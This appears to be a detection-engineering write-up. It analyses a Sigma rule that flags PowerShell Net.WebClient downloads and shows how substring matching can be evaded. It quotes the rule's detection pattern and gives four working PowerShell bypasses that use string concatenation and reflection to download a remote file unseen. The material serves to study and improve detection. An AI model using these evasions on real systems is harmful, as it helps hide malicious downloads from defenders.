# ADE1-01 Example: Suspicious PowerShell Download Bypass

**Bug Category:** ADE1-01 Reformatting in Actions - Substring Manipulation

## Original Rule

**Source:** [Sigma - Suspicious PowerShell Download](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_classic/posh_pc_susp_download.yml)

```yaml
title: Suspicious PowerShell Download
detection:
    selection_webclient:
        Data|contains: 'Net.WebClient'
    selection_download:
        Data|contains:
            - '.DownloadFile('
            - '.DownloadString('
    condition: all of selection_*
```

## The Bug

The detection logic searches for the presence of `Net.WebClient`, `.DownloadString(` and `.DownloadFile(` methods in the `Data` field of the classic PowerShell log (`ps_classic_start`).

**Hypothesis Test:**
- Condition A: substring `Net.WebClient` exists, AND
- Condition B: substring `.DownloadString(` exists, OR
- Condition C: substring `.DownloadFile(` exists

Can be understood as `Hit when A AND (B OR C) == True`

**The bug:** Reliance on substrings that are mutable by the attacker.

## Bypasses

### Bypass 1: Method Name Obfuscation with Variable Usage

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$methodName = "Down" + "loadString";
$file = $wc.$methodName($url);
Set-Content -Path "DIRECTORY_TO_WRITE_TO\evil.txt" -Value $file
```

### Bypass 2: Method Name Obfuscation (Short Form)

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$wc.("Download" + "File")($url,"DIRECTORY_TO_WRITE_TO\evil.txt")
```

### Bypass 3: InvokeMember Reflection

**Bug Categories:** ADE1-01 + ADE2-01 (Omit Alternative Method/Binary)

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$file = $wc.GetType().InvokeMember("DownloadString","InvokeMethod,Public,Instance",$null,$wc,@($url));
Set-Content -Path "DIRECTORY_TO_WRITE_TO\evil.txt" -Value $file
```

**Note:** The Sigma rule uses exact match `.DownloadString(` (including `.` and `(` characters), making it vulnerable to reflection via `InvokeMethod`.

### Bypass 4: GetMethods Reflection

```PowerShell
$url = "ADDRESS\evil.txt";
$wc = New-Object Net.WebClient;
$method = $wc.GetType().GetMethods() | Where-Object { $_.Name -eq "DownloadString" -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq "String" };
$file = $method.Invoke($wc, @($url));
Set-Content -Path "DIRECTORY_TO_WRITE_TO\evil.txt" -Value $file
```

## Impact

All bypasses result in successful file download from remote host without triggering the detection rule.

---

**Related Documentation:**
- [ADE1 Reformatting in Actions](../../docs/taxonomy/ade1-reformatting-in-actions.md)
- [ADE2 Omit Alternatives](../../docs/taxonomy/ade2-omit-alternatives.md)
- [Detection Logic Bug Theory](../../docs/theory/detection-logic-bugs.md)
